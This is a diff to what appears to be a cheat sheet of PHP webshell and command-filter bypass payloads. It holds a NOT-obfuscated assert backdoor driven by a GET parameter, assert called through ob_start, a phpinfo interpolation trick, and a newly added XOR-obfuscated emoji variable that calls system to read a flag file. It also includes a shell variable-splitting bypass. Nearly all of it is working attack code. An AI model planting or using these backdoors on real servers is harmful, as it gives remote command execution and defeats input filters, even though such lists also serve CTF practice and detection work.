@@ -84,7 +84,7 @@ Table of Contents
 // From: http://www.zeroplace.cn/article.asp?id=906
 
 <?php $x=~¾¬¬º­«;$x($_GET['a']); ?>
-// xor backdoor (assert)
+// not backdoor (assert)
 // .php?a=system("ls")
 
 echo "{${phpinfo()}}";
@@ -115,6 +115,11 @@ ob_start('assert');
 echo $_REQUEST['pass'];
 ob_end_flush();
 ?>
+
+<?=
+$💩 = '[[[[@@' ^ '("(/%-';
+$💩(('@@['^'#!/')." /????");
+
 
 A=fl;B=ag;cat $A$B
 
